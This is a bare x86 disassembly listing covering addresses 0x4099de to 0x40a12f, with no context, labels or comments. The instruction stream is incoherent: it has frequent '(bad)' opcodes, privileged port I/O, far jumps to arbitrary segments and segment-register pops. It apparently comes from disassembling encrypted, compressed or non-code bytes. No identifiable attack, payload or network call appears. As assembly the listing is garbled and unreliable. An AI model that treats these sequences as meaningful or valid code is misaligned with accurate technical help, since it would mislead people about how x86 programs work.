  4099de:	pop    edi
  4099df:	adc    eax,edi
  4099e1:	ja     0x4099eb
  4099e3:	cmp    dl,BYTE PTR [eax+0x7d7ed3]
  4099e9:	adc    eax,0x96edbffa
  4099ee:	(bad)
  4099f1:	sar    al,cl
  4099f3:	mov    cl,0x42
  4099f5:	cmc    
  4099f6:	in     al,0xa5
  4099f8:	sub    edi,ebp
  4099fa:	push   esi
  4099fb:	mov    bl,0x66
  4099fd:	push   edx
  4099fe:	lds    eax,FWORD PTR [edx+0x66]
  409a01:	add    al,0x4f
  409a03:	push   edi
  409a04:	adc    al,0x2
  409a06:	xor    dh,BYTE PTR [edi-0x20405de4]
  409a0c:	ja     0x409a27
  409a0e:	pop    ebp
  409a0f:	in     eax,0xe4
  409a11:	mul    DWORD PTR [esi+0x13936326]
  409a17:	outs   dx,BYTE PTR ds:[esi]
  409a18:	cmp    DWORD PTR [edx],ebp
  409a1a:	sahf   
  409a1b:	xchg   edx,eax
  409a1c:	sub    al,0xa0
  409a1e:	dec    eax
  409a1f:	push   ds
  409a20:	dec    edi
  409a21:	or     eax,0xb108c80d
  409a26:	lea    edx,[ecx-0x59c6411c]
  409a2c:	jb     0x4099be
  409a2e:	or     BYTE PTR [ecx-0x2876c46],ah
  409a34:	ret    
  409a35:	pop    ebx
  409a36:	test   BYTE PTR [esi-0x4e],dh
  409a39:	adc    eax,0xa4fee80f
  409a3e:	scas   eax,DWORD PTR es:[edi]
  409a3f:	pop    ds
  409a40:	pop    ebp
  409a41:	dec    edx
  409a42:	mov    BYTE PTR [ebp+eax*2-0x52a3979e],dh
  409a49:	(bad)  
  409a4a:	repz enter 0xda81,0xed
  409a4f:	jmp    0x409a59
  409a51:	ja     0x409a1f
  409a53:	sub    eax,0xb86fb993
  409a58:	cmp    al,0x18
  409a5a:	push   ebp
  409a5b:	push   0x9b1abeb
  409a60:	lods   al,BYTE PTR ds:[esi]
  409a61:	jg     0x409aaf
  409a63:	jmp    0x5b76b76e
  409a68:	cld    
  409a69:	icebp  
  409a6a:	je     0x409a31
  409a6c:	pop    esp
  409a6d:	mov    WORD PTR [ecx+0x66],fs
  409a70:	inc    edi
  409a71:	and    DWORD PTR [ebp+ebx*1-0x2e708e31],0x1
  409a79:	xor    esi,0x807e593c
  409a7f:	pop    ds
  409a80:	fadd   DWORD PTR [edi+0x1b]
  409a83:	or     dh,0x4f
  409a86:	sbb    BYTE PTR [eax-0x552cce84],ah
  409a8c:	hlt    
  409a8d:	shl    BYTE PTR fs:[edx-0x11],0x1f
  409a92:	push   edi
  409a93:	out    0xab,eax
  409a95:	push   esp
  409a96:	sar    DWORD PTR [eax+0x43],0xb6
  409a9a:	ror    BYTE PTR [esp+edi*8-0x78],1
  409a9e:	add    al,0x8f
  409aa0:	fist   WORD PTR [ecx]
  409aa2:	leave  
  409aa3:	out    0x1a,eax
  409aa5:	rcl    esi,1
  409aa7:	xor    BYTE PTR [esi-0x4e],0x92
  409aab:	xchg   ebx,eax
  409aac:	xchg   ecx,eax
  409aad:	adc    eax,0x5b19cd20
  409ab2:	ins    DWORD PTR es:[edi],dx
  409ab3:	mov    ebp,0x46ab59e8
  409ab8:	(bad)
  409abb:	int3   
  409abc:	leave  
  409abd:	das    
  409abe:	jmp    0x9859cc6
  409ac3:	jle    0x409ab8
  409ac5:	xor    cl,BYTE PTR [edi]
  409ac7:	in     al,0x8a
  409ac9:	mov    ecx,DWORD PTR [edi+0x41]
  409acc:	adc    ecx,DWORD PTR [esi+0x4b]
  409acf:	xchg   ebp,eax
  409ad0:	mov    al,ds:0xc86218c0
  409ad5:	dec    esi
  409ad6:	xchg   edx,eax
  409ad7:	mov    bh,0x4a
  409ad9:	sub    al,0x44
  409adb:	sahf   
  409adc:	push   ebp
  409add:	pop    eax
  409ade:	pop    esi
  409adf:	pushf  
  409ae0:	push   ebx
  409ae1:	sub    DWORD PTR [eax-0x51c4f09a],eax
  409ae7:	in     eax,dx
  409ae8:	jmp    0x409aea
  409aea:	int    0x3
  409aec:	jo     0x409b54
  409aee:	xchg   BYTE PTR [ebx+0x64],ah
  409af1:	jo     0x409ad8
  409af3:	cld    
  409af4:	xlat   BYTE PTR ds:[ebx]
  409af5:	sti    
  409af6:	aaa    
  409af7:	sub    dh,BYTE PTR [esi-0xd]
  409afa:	sub    ebp,DWORD PTR [esi+0x9]
  409afd:	daa    
  409afe:	call   FWORD PTR [edi+0x23]
  409b01:	add    al,0x1f
  409b03:	xchg   edx,eax
  409b04:	stos   DWORD PTR es:[edi],eax
  409b05:	in     eax,dx
  409b06:	cmp    esp,DWORD PTR [ebp+ebp*8-0x2296f98e]
  409b0d:	mov    bl,0xa2
  409b0f:	dec    ebp
  409b10:	je     0x409b60
  409b12:	sub    ebx,ecx
  409b14:	push   eax
  409b15:	xchg   ebp,eax
  409b16:	inc    esi
  409b17:	pop    esi
  409b18:	inc    eax
  409b19:	xchg   ebx,eax
  409b1a:	je     0x409b15
  409b1c:	test   eax,0xfa1c3b71
  409b21:	out    0x17,al
  409b23:	pop    ss
  409b24:	mov    ah,0x9f
  409b26:	push   ebx
  409b27:	pop    ss
  409b28:	pop    ebp
  409b29:	ss mov al,0xd8
  409b2c:	pushf  
  409b2d:	push   ebx
  409b2e:	mov    ?,dx
  409b31:	and    eax,0x54ccc7cd
  409b36:	mov    bl,0x53
  409b38:	cmp    eax,0x505f314c
  409b3d:	mov    DWORD PTR [eax+0x78],ebx
  409b40:	arpl   WORD PTR [eax],bp
  409b42:	dec    esi
  409b43:	rcl    esp,cl
  409b45:	push   edi
  409b46:	inc    eax
  409b47:	sbb    dh,BYTE PTR [edx+0x30]
  409b4a:	mov    dh,0xbb
  409b4c:	rol    DWORD PTR [edx-0x6f],cl
  409b4f:	inc    eax
  409b50:	mov    ds:0x4c28b325,eax
  409b55:	fidiv  WORD PTR [ecx]
  409b57:	mov    ?,WORD PTR [edx]
  409b59:	push   es
  409b5a:	inc    edx
  409b5b:	fdivr  st,st(6)
  409b5d:	and    eax,0x675e11e4
  409b62:	jb     0x409b02
  409b64:	jns    0x409b63
  409b66:	outs   dx,BYTE PTR ds:[esi]
  409b67:	js     0x409b61
  409b69:	cmp    esi,DWORD PTR [eax+0x19]
  409b6c:	pop    ebp
  409b6d:	loopne 0x409b32
  409b6f:	lea    ecx,[ecx]
  409b71:	cli    
  409b72:	xor    dh,dh
  409b74:	xor    DWORD PTR [ecx-0x6867ae9e],eax
  409b7a:	mov    dl,0x8f
  409b7c:	mov    eax,0x26d8cca1
  409b81:	cmp    edx,edi
  409b83:	call   0xccfc:0x98769d39
  409b8a:	pusha  
  409b8b:	aaa    
  409b8c:	rol    BYTE PTR [edx+0x3ebfd79f],1
  409b92:	mov    bl,0x82
  409b94:	and    esi,DWORD PTR [ebx-0x1646b50d]
  409b9a:	es mov bh,0x4c
  409b9d:	or     esi,DWORD PTR [ebx+eiz*8-0x2038db2c]
  409ba4:	out    0xcf,al
  409ba6:	sbb    BYTE PTR [edx+0x366f503a],ch
  409bac:	mov    bh,0x0
  409bae:	out    0x8f,eax
  409bb0:	inc    ebx
  409bb1:	mov    WORD PTR [eax],?
  409bb3:	bound  edx,QWORD PTR [esi]
  409bb5:	xor    ecx,DWORD PTR [ebp-0x61]
  409bb8:	jae    0x409b91
  409bba:	pop    es
  409bbb:	jle    0x409b9a
  409bbd:	test   eax,0xcf8dfff1
  409bc2:	mov    ecx,0x75842c5b
  409bc7:	in     eax,dx
  409bc8:	fcmovnu st,st(4)
  409bca:	or     ebp,DWORD PTR ds:0x845a3992
  409bd0:	dec    edx
  409bd1:	push   edi
  409bd2:	jae    0x409bf9
  409bd4:	jbe    0x409b6e
  409bd6:	xor    al,0x38
  409bd8:	out    dx,al
  409bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bda:	into   
  409bdb:	and    BYTE PTR [ebp-0x35],bh
  409bde:	sar    BYTE PTR ds:0xa3a1ba54,cl
  409be4:	dec    ecx
  409be5:	dec    edx
  409be6:	xor    BYTE PTR [eax+ebp*1+0x5],bl
  409bea:	xlat   BYTE PTR ds:[ebx]
  409beb:	(bad)  
  409bec:	(bad)  ds:0x5455570a
  409bf2:	jl     0x409c0e
  409bf4:	ins    DWORD PTR es:[edi],dx
  409bf5:	xchg   ebx,eax
  409bf6:	push   ebx
  409bf7:	xchg   edi,eax
  409bf8:	xchg   edi,eax
  409bf9:	mov    dh,0xfd
  409bfb:	xlat   BYTE PTR ds:[ebx]
  409bfc:	std    
  409bfd:	push   esi
  409bfe:	or     al,0x50
  409c00:	jl     0x409c47
  409c02:	sub    BYTE PTR [esi-0x1a75019e],0x79
  409c09:	mov    eax,ds:0x581271c1
  409c0e:	nop
  409c0f:	call   0xf941:0xaff73e13
  409c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c17:	js     0x409c36
  409c19:	push   0x287711df
  409c1e:	out    0x53,eax
  409c20:	mov    eax,0x5726ca9c
  409c25:	ror    BYTE PTR [edi+0x2f1b285],1
  409c2b:	jp     0x409cab
  409c2d:	xchg   edx,eax
  409c2e:	push   ecx
  409c2f:	in     al,0x29
  409c31:	cmp    BYTE PTR [ecx],0xf5
  409c34:	mov    ecx,eax
  409c36:	lahf   
  409c37:	mov    edi,0xd7a54c21
  409c3c:	inc    edx
  409c3d:	in     ax,dx
  409c3f:	test   esp,esi
  409c41:	dec    edx
  409c42:	add    BYTE PTR [ebx],bh
  409c44:	mov    esp,0x40b62b21
  409c49:	js     0x409bce
  409c4b:	mov    dh,0x95
  409c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c4e:	push   es
  409c4f:	pop    es
  409c50:	ret    
  409c51:	push   cs
  409c52:	scas   al,BYTE PTR es:[edi]
  409c53:	ins    BYTE PTR es:[edi],dx
  409c54:	(bad)  
  409c56:	fwait
  409c57:	pop    edi
  409c58:	scas   eax,DWORD PTR es:[edi]
  409c59:	inc    ecx
  409c5a:	in     eax,0x24
  409c5c:	popf   
  409c5d:	loopne 0x409c11
  409c5f:	in     eax,0x66
  409c61:	scas   al,BYTE PTR es:[edi]
  409c62:	xor    cl,BYTE PTR [ebp+0x7e]
  409c65:	push   eax
  409c66:	nop
  409c67:	test   eax,0x7d1833aa
  409c6c:	retf   0x4beb
  409c6f:	xrelease xchg BYTE PTR [esi],dl
  409c72:	popa   
  409c73:	push   ss
  409c74:	add    eax,0xc063c900
  409c79:	xor    esi,DWORD PTR [ecx-0x50]
  409c7c:	outs   dx,DWORD PTR es:[esi]
  409c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c7f:	popa   
  409c80:	out    0x8,al
  409c82:	or     eax,DWORD PTR [ecx+0x3ad7cdea]
  409c88:	mov    BYTE PTR ds:0x497a222b,cl
  409c8e:	repz shl BYTE PTR [ecx-0x2b],cl
  409c92:	mov    dh,0xe6
  409c94:	loopne 0x409c3e
  409c96:	mov    ebx,0xd0774f19
  409c9b:	cmp    BYTE PTR [ecx-0x7],dh
  409c9e:	cmp    BYTE PTR [edi],ah
  409ca0:	sbb    DWORD PTR [ecx+esi*4],ecx
  409ca3:	mov    cl,0x5c
  409ca5:	imul   edi,DWORD PTR [esi+0x64a0d94],0x6
  409cac:	ss call 0x4b0:0x2bf2a851
  409cb4:	xor    al,0x1f
  409cb6:	jecxz  0x409d1e
  409cb8:	stos   DWORD PTR es:[edi],eax
  409cb9:	and    al,0xfc
  409cbb:	xor    al,BYTE PTR [esi]
  409cbd:	mov    dl,0x59
  409cbf:	sti    
  409cc0:	fcom   DWORD PTR [eax+0x30a5b565]
  409cc6:	imul   ebp,DWORD PTR [ebp+ecx*2-0x4f],0xffffff88
  409ccb:	les    ebp,FWORD PTR [esi]
  409ccd:	jmp    0xb6dd2133
  409cd2:	shr    DWORD PTR [esi+0x419cb62],0xad
  409cd9:	cmc    
  409cda:	mov    eax,0x836b8616
  409cdf:	sbb    DWORD PTR [eax-0x4d66e753],esp
  409ce5:	push   0x74
  409ce7:	jp     0x409d28
  409ce9:	pop    ds
  409cea:	jle    0x409cab
  409cec:	fcmovnbe st,st(2)
  409cee:	xor    BYTE PTR [ebx-0x57],dh
  409cf1:	sub    al,0x29
  409cf3:	push   edi
  409cf4:	sbb    BYTE PTR [eax-0x7c],bh
  409cf7:	shr    DWORD PTR [edx+0x9],0xf4
  409cfb:	bound  edx,QWORD PTR [ebx]
  409cfd:	xchg   esp,eax
  409cfe:	dec    eax
  409cff:	scas   al,BYTE PTR es:[edi]
  409d00:	setnp  BYTE PTR [ecx+0x3d]
  409d04:	lds    esp,FWORD PTR [edx+eax*8-0x1c]
  409d08:	and    esp,ebx
  409d0a:	mov    al,0xb4
  409d0c:	loopne 0x409cd5
  409d0e:	call   0x14ea5e6d
  409d13:	add    DWORD PTR [eax+edi*1],edx
  409d16:	xchg   esp,eax
  409d17:	xchg   esi,eax
  409d18:	jmp    0x409d31
  409d1a:	fsub   QWORD PTR es:[ebx-0x6b288d8a]
  409d21:	shr    eax,cl
  409d23:	xor    esp,DWORD PTR [eax-0x5f4800cd]
  409d29:	arpl   WORD PTR [eax],ax
  409d2b:	push   edx
  409d2c:	pop    edi
  409d2d:	sub    DWORD PTR [ecx],eax
  409d2f:	outs   dx,BYTE PTR ds:[esi]
  409d30:	stos   BYTE PTR es:[edi],al
  409d31:	es aaa 
  409d33:	lods   eax,DWORD PTR ds:[esi]
  409d34:	adc    eax,DWORD PTR [ebp+edx*2-0x72]
  409d38:	ret    
  409d39:	and    al,0x74
  409d3b:	std    
  409d3c:	mov    cl,0x2f
  409d3e:	adc    eax,0x38963cb3
  409d43:	into   
  409d44:	fsub   QWORD PTR [edx]
  409d46:	lea    ecx,[esi+eiz*1-0x50]
  409d4a:	daa    
  409d4b:	adc    DWORD PTR [ebx],ebx
  409d4d:	jmp    0x409da9
  409d4f:	pop    edx
  409d50:	adc    ebp,ebp
  409d52:	cdq    
  409d53:	xor    ah,BYTE PTR [esi-0x3b]
  409d56:	mov    eax,0x364630e9
  409d5b:	fwait
  409d5c:	pop    ss
  409d5d:	fiadd  DWORD PTR [ebp+0x49]
  409d60:	and    BYTE PTR [ecx-0x14],0x1b
  409d64:	(bad)  
  409d65:	xor    ecx,eax
  409d67:	(bad)  
  409d69:	jecxz  0x409dab
  409d6b:	pop    eax
  409d6c:	in     al,dx
  409d6d:	pop    ecx
  409d6e:	and    DWORD PTR [edi],0xa
  409d71:	cld    
  409d72:	adc    BYTE PTR ds:0x1bd6966f,bl
  409d78:	sub    eax,0xa9af5870
  409d7d:	loop   0x409d6b
  409d7f:	sbb    BYTE PTR [esi-0x5f],0x55
  409d83:	push   cs
  409d84:	mov    eax,ds:0x11eb9327
  409d89:	fwait
  409d8a:	mov    edx,0x33fedcfc
  409d8f:	inc    ecx
  409d90:	fwait
  409d91:	jmp    0x8214:0xd0fa78fa
  409d98:	jno    0x409d56
  409d9a:	sub    DWORD PTR [edx+0x4204a117],esi
  409da0:	xor    BYTE PTR [ecx],bh
  409da2:	pop    edx
  409da3:	add    al,0x96
  409da5:	xchg   DWORD PTR [ebp+0x19],edx
  409da8:	push   ds
  409da9:	ins    DWORD PTR es:[edi],dx
  409daa:	xor    al,0xf8
  409dac:	mov    WORD PTR [esi+0x18385a5c],cs
  409db2:	xor    ebp,DWORD PTR [ebx]
  409db4:	and    eax,0xdfe8445f
  409db9:	fst    DWORD PTR [edi+0x665e0e3]
  409dbf:	push   edx
  409dc0:	pop    ebp
  409dc1:	xor    BYTE PTR [esi],bh
  409dc3:	jl     0x409d76
  409dc5:	jb     0x409e08
  409dc7:	push   ecx
  409dc8:	dec    edi
  409dc9:	jae    0x409dac
  409dcb:	jnp    0x409e1c
  409dcd:	test   al,0x64
  409dcf:	leave  
  409dd0:	and    BYTE PTR [eax],bl
  409dd2:	sbb    ah,BYTE PTR [eax+0x493e6cde]
  409dd8:	pop    ecx
  409dd9:	ins    BYTE PTR es:[edi],dx
  409dda:	shl    DWORD PTR [esi+0x1d],1
  409ddd:	adc    DWORD PTR [edx],0x3a327d94
  409de3:	dec    esp
  409de4:	pop    es
  409de5:	stos   DWORD PTR es:[edi],eax
  409de6:	xchg   ecx,eax
  409de7:	je     0x409d95
  409de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dea:	push   ebp
  409deb:	mov    eax,0x8434d115
  409df0:	sbb    BYTE PTR [edx-0x6deee4f7],al
  409df6:	xchg   esp,eax
  409df7:	push   dx
  409df9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dfa:	mov    al,ds:0xe012e6af
  409dff:	push   ss
  409e00:	es dec edx
  409e02:	hlt    
  409e03:	clc    
  409e04:	imul   eax,ecx,0x4c
  409e07:	int    0x19
  409e09:	xlat   BYTE PTR ds:[ebx]
  409e0a:	pop    eax
  409e0b:	fs pop esp
  409e0d:	aaa    
  409e0e:	push   es
  409e0f:	jge    0x409dc3
  409e11:	and    BYTE PTR ds:0x2eed3850,ch
  409e17:	and    BYTE PTR [edi-0x3d304d1b],0x3f
  409e1e:	(bad)  
  409e1f:	mov    eax,ds:0x2701ad19
  409e24:	push   edx
  409e25:	pop    esp
  409e26:	out    dx,eax
  409e27:	mov    ?,WORD PTR [edi-0x42]
  409e2a:	popf   
  409e2b:	add    edi,DWORD PTR [edx-0x4e3b412f]
  409e31:	fstp   TBYTE PTR [ecx-0x7f]
  409e34:	bound  esp,QWORD PTR [edi-0x6e]
  409e37:	arpl   bp,bx
  409e39:	mov    ecx,0xca2e3c84
  409e3e:	inc    esi
  409e3f:	mov    edi,0xa8fc54f9
  409e44:	xchg   ebp,eax
  409e45:	(bad)  
  409e46:	mov    eax,ds:0x968a3858
  409e4b:	in     eax,dx
  409e4c:	lock out dx,al
  409e4e:	cmp    ebx,DWORD PTR [edi-0x52fb9ab8]
  409e54:	jno    0x409e22
  409e56:	lahf   
  409e57:	pop    ebp
  409e58:	icebp  
  409e59:	cmp    BYTE PTR [edi-0x1c],ch
  409e5c:	inc    eax
  409e5d:	inc    ecx
  409e5e:	(bad)  
  409e5f:	into   
  409e60:	outs   dx,DWORD PTR ds:[esi]
  409e61:	mov    ch,0xb3
  409e63:	inc    ecx
  409e64:	fsubp  st(4),st
  409e66:	dec    edx
  409e67:	cmp    edx,edx
  409e69:	dec    ebp
  409e6a:	sbb    ch,BYTE PTR [edx-0x7d]
  409e6d:	(bad)  
  409e6f:	jnp    0x409e29
  409e71:	and    ebp,DWORD PTR [edi+0x5d]
  409e74:	jg     0x409e58
  409e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e77:	int3   
  409e78:	lds    edi,FWORD PTR [esi-0x54]
  409e7b:	and    al,0xa5
  409e7d:	rol    BYTE PTR [esi+0x6c5cea62],0x68
  409e84:	jmp    0x61f6:0x200fec85
  409e8b:	sahf   
  409e8c:	in     al,dx
  409e8d:	adc    dh,bl
  409e8f:	push   ds
  409e90:	xor    ebx,ebp
  409e92:	xor    al,0x57
  409e94:	call   0xdc96:0x283196d2
  409e9b:	repnz addr16 icebp 
  409e9e:	pop    es
  409e9f:	xor    dh,dl
  409ea1:	ror    BYTE PTR ds:0x8b9a9382,1
  409ea7:	or     edx,ebp
  409ea9:	(bad)  
  409eaa:	jl     0x409ec4
  409eac:	aad    0x4c
  409eae:	push   ecx
  409eaf:	sahf   
  409eb0:	sti    
  409eb1:	mov    ch,ch
  409eb3:	push   esp
  409eb4:	sub    eax,0xb6fb37b4
  409eb9:	xor    eax,DWORD PTR [eax]
  409ebb:	xor    eax,0x209218f3
  409ec0:	inc    edx
  409ec1:	or     eax,0x20a42e7f
  409ec6:	inc    ecx
  409ec7:	arpl   WORD PTR [ebp+ebx*8-0x7842d783],di
  409ece:	cmp    eax,DWORD PTR [edx+esi*4+0x62]
  409ed2:	pop    eax
  409ed3:	xor    BYTE PTR [ebp+0x35],bh
  409ed6:	dec    esi
  409ed7:	cmp    ecx,DWORD PTR [ecx]
  409ed9:	sub    eax,0x2712e484
  409ede:	push   0x7fa76230
  409ee3:	pusha  
  409ee4:	xchg   edx,eax
  409ee5:	out    0x5,al
  409ee7:	pop    ds
  409ee8:	jb     0x409eba
  409eea:	stc    
  409eeb:	sti    
  409eec:	push   cs
  409eed:	mov    eax,0x93e276ce
  409ef2:	sub    dh,BYTE PTR [ebx]
  409ef4:	push   ss
  409ef5:	out    dx,al
  409ef6:	jns    0x409ecd
  409ef8:	mov    bl,dh
  409efa:	sahf   
  409efb:	xor    BYTE PTR [ecx+ecx*2],0x92
  409eff:	shr    BYTE PTR [eax],1
  409f01:	rcr    DWORD PTR [ebx],0xbb
  409f04:	and    al,0xb5
  409f06:	rcr    BYTE PTR [edx],0xa1
  409f09:	ficom  DWORD PTR [ecx]
  409f0b:	fwait
  409f0c:	dec    edx
  409f0d:	cmp    BYTE PTR [edi+0x40b38f73],0x6f
  409f14:	sbb    edi,esp
  409f16:	daa    
  409f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f18:	sbb    al,0x8b
  409f1a:	mov    esi,0x33698c7c
  409f1f:	aaa    
  409f20:	sub    dh,BYTE PTR [ecx+edx*1]
  409f23:	xchg   ebp,eax
  409f24:	mov    bl,0xca
  409f26:	mov    bl,0x14
  409f28:	mov    al,0xa6
  409f2a:	dec    ebx
  409f2b:	pop    eax
  409f2c:	sub    ch,BYTE PTR [ebx+ecx*8]
  409f2f:	int    0xa5
  409f31:	lods   eax,DWORD PTR ds:[esi]
  409f32:	in     al,dx
  409f33:	je     0x409ec4
  409f35:	mov    ebx,0x74a8384d
  409f3a:	mov    ch,0x64
  409f3c:	sub    BYTE PTR [esi-0x165fc5fb],bl
  409f42:	lods   eax,DWORD PTR ds:[esi]
  409f43:	adc    bl,BYTE PTR [edi-0x7d]
  409f46:	call   0x8159:0x463ff67e
  409f4d:	addr16 mov al,0xaa
  409f50:	test   al,0x5a
  409f52:	es das 
  409f54:	pusha  
  409f55:	ins    DWORD PTR es:[edi],dx
  409f56:	and    DWORD PTR [ecx],ebx
  409f58:	cmc    
  409f59:	mov    BYTE PTR [ebx],0x83
  409f5c:	in     al,dx
  409f5d:	mov    ah,0x89
  409f5f:	loop   0x409ef5
  409f61:	scas   eax,DWORD PTR es:[edi]
  409f62:	popf   
  409f63:	mov    DWORD PTR [edx+eiz*2+0x40],edx
  409f67:	cmp    bh,BYTE PTR [ebx]
  409f69:	push   esi
  409f6a:	loope  0x409fd1
  409f6c:	pop    DWORD PTR [eax]
  409f6e:	arpl   WORD PTR [edi+0x10125e7e],cx
  409f74:	mov    dh,0x2c
  409f76:	int3   
  409f77:	fwait
  409f78:	mov    edx,0xb4aff6da
  409f7d:	clc    
  409f7e:	inc    esp
  409f7f:	push   esp
  409f80:	jmp    0x409f8e
  409f82:	mov    edi,0x69d64e80
  409f87:	pusha  
  409f88:	sbb    ebx,DWORD PTR [ebx+0x16a40d69]
  409f8e:	sub    BYTE PTR [ecx-0x9],0xa6
  409f92:	jp     0x409fe7
  409f94:	and    eax,0x1d067b9a
  409f99:	daa    
  409f9a:	icebp  
  409f9b:	jecxz  0x409f79
  409f9d:	adc    BYTE PTR ds:0x9bff1d4b,ch
  409fa3:	jbe    0x409ff6
  409fa5:	sahf   
  409fa6:	mov    dh,0xe3
  409fa8:	sbb    al,0x1b
  409faa:	push   ecx
  409fab:	lods   eax,DWORD PTR ds:[esi]
  409fac:	js     0x409f4c
  409fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409faf:	stos   BYTE PTR es:[edi],al
  409fb0:	dec    edi
  409fb1:	xor    ebx,edx
  409fb3:	lods   ax,WORD PTR ds:[esi]
  409fb5:	addr16 dec ecx
  409fb7:	xor    ecx,DWORD PTR [edi]
  409fb9:	out    0xe1,al
  409fbb:	sbb    eax,0x99959c6f
  409fc0:	cdq    
  409fc1:	cmp    esi,DWORD PTR [esi-0x3f]
  409fc4:	xor    bl,bh
  409fc6:	fisub  DWORD PTR [ebx-0x2c9a9bda]
  409fcc:	cli    
  409fcd:	repnz in al,dx
  409fcf:	mov    cs,WORD PTR [edi-0x77]
  409fd2:	(bad)  
  409fd3:	(bad)  
  409fd5:	jae    0x40a03c
  409fd7:	add    DWORD PTR [ebx-0x2c],ebp
  409fda:	test   al,0x2c
  409fdc:	and    ebp,DWORD PTR [ebx]
  409fde:	iret   
  409fdf:	std    
  409fe0:	test   al,0x4f
  409fe2:	ds loope 0x40a02c
  409fe5:	out    0x4d,eax
  409fe7:	int3   
  409fe8:	push   edx
  409fe9:	xor    al,0xde
  409feb:	or     DWORD PTR [ebp+0x6942b3e7],ecx
  409ff1:	(bad)  
  409ff2:	in     eax,dx
  409ff3:	sbb    esi,DWORD PTR [edx+0x1ad3ea90]
  409ff9:	shr    BYTE PTR [eax+0x56f22233],1
  409fff:	sub    edi,ecx
  40a001:	push   ds
  40a002:	icebp  
  40a003:	xor    al,0xc4
  40a005:	jnp    0x40a03f
  40a007:	jle    0x40a05f
  40a009:	xor    ch,BYTE PTR [ebp+ecx*4+0x15cfc84d]
  40a010:	add    DWORD PTR [eax+esi*2+0x4d],0x44
  40a015:	lds    esi,FWORD PTR [ebx+esi*2-0x60c9eb85]
  40a01c:	imul   ecx,edx,0xde73ccd
  40a022:	sub    cl,ch
  40a024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a025:	fisttp QWORD PTR [edi]
  40a027:	push   es
  40a028:	xchg   esi,eax
  40a029:	cmp    BYTE PTR [ecx-0x3b],dh
  40a02c:	adc    DWORD PTR [ebx],0xf3db8653
  40a032:	jle    0x40a075
  40a034:	in     al,dx
  40a035:	in     eax,0x28
  40a037:	aas    
  40a038:	inc    ebp
  40a039:	clc    
  40a03a:	int3   
  40a03b:	ins    BYTE PTR es:[edi],dx
  40a03c:	sbb    eax,0xec97667f
  40a041:	neg    BYTE PTR [edi-0x26d66432]
  40a047:	and    al,0xa7
  40a049:	cld    
  40a04a:	mov    bl,0xa
  40a04c:	loope  0x40a07d
  40a04e:	(bad)  
  40a04f:	ja     0x409fec
  40a051:	in     eax,0xbf
  40a053:	dec    ebx
  40a054:	cli    
  40a055:	clc    
  40a056:	jp     0x409fdb
  40a058:	push   edi
  40a059:	inc    ebx
  40a05a:	and    eax,0x7d424eb8
  40a05f:	inc    ecx
  40a060:	mov    esi,0xf403dcce
  40a065:	fwait
  40a066:	stos   BYTE PTR es:[edi],al
  40a067:	es jae 0x409ffb
  40a06a:	jno    0x40a032
  40a06c:	rol    bl,0x4f
  40a06f:	fdiv   DWORD PTR [ecx+0x54]
  40a072:	popf   
  40a073:	mov    al,ds:0x609e6566
  40a078:	lods   al,BYTE PTR ds:[esi]
  40a079:	(bad)  
  40a07b:	test   al,0xa7
  40a07d:	loope  0x40a0f4
  40a07f:	xor    ebp,DWORD PTR [eax+0x5170a0d3]
  40a085:	add    bh,ch
  40a087:	imul   ecx,DWORD PTR [edi+0x3e989012],0x29063bf
  40a091:	test   BYTE PTR [esi+esi*1],bl
  40a094:	mov    dh,0x43
  40a096:	addr16 push ebp
  40a098:	stc    
  40a099:	push   ebp
  40a09a:	push   esp
  40a09b:	jbe    0x40a063
  40a09d:	add    eax,0x72ffa66b
  40a0a2:	and    DWORD PTR [eax+ecx*1+0x6c3ea8ff],0xffffff96
  40a0aa:	sbb    eax,0x49b4314b
  40a0af:	shr    DWORD PTR [edi],0x2d
  40a0b2:	in     al,0xb0
  40a0b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0b5:	inc    edx
  40a0b6:	dec    BYTE PTR [esi-0x20]
  40a0b9:	inc    edx
  40a0ba:	mov    al,ds:0xe9ec4c03
  40a0bf:	mov    dh,0xc2
  40a0c1:	int    0x2d
  40a0c3:	ins    DWORD PTR es:[edi],dx
  40a0c4:	or     al,0x5e
  40a0c6:	xchg   ecx,eax
  40a0c7:	scas   al,BYTE PTR es:[edi]
  40a0c8:	in     al,dx
  40a0c9:	mov    dl,0xa8
  40a0cb:	stos   DWORD PTR es:[edi],eax
  40a0cc:	sbb    DWORD PTR [edi+ecx*1+0x65765ecb],esp
  40a0d3:	cmp    BYTE PTR [eax-0x5348a6c6],0xa4
  40a0da:	dec    edx
  40a0db:	(bad)  
  40a0dc:	inc    edi
  40a0dd:	in     eax,dx
  40a0de:	sti    
  40a0df:	dec    esp
  40a0e0:	push   0xffffffc0
  40a0e2:	xchg   DWORD PTR [edx],esi
  40a0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0e5:	mov    al,0x5f
  40a0e7:	gs sub eax,0x73379372
  40a0ed:	mov    ds:0xc2f1067c,eax
  40a0f2:	popa   
  40a0f3:	xor    al,0x68
  40a0f5:	push   eax
  40a0f6:	mov    dh,ah
  40a0f8:	fxam   
  40a0fa:	lods   eax,DWORD PTR ds:[esi]
  40a0fb:	sbb    DWORD PTR [eax-0x50],edx
  40a0fe:	or     ebp,DWORD PTR [edx]
  40a100:	data16 into 
  40a102:	mov    bl,cl
  40a104:	and    ah,dh
  40a106:	loope  0x40a187
  40a108:	xor    eax,0xd03ae76
  40a10d:	mov    bl,0xa2
  40a10f:	popf   
  40a110:	push   eax
  40a111:	aam    0x86
  40a113:	mov    ecx,0x47689ebf
  40a118:	into   
  40a119:	cmp    ch,BYTE PTR [edx+0x0]
  40a11c:	or     edi,ecx
  40a11e:	out    dx,al
  40a11f:	lds    ebp,FWORD PTR [ebp-0x1d]
  40a122:	or     eax,0xd70f57a7
  40a127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a128:	jge    0x40a0aa
  40a12a:	push   0x63
  40a12c:	fsub   DWORD PTR [ebp+0x44]
  40a12f:	pusha  
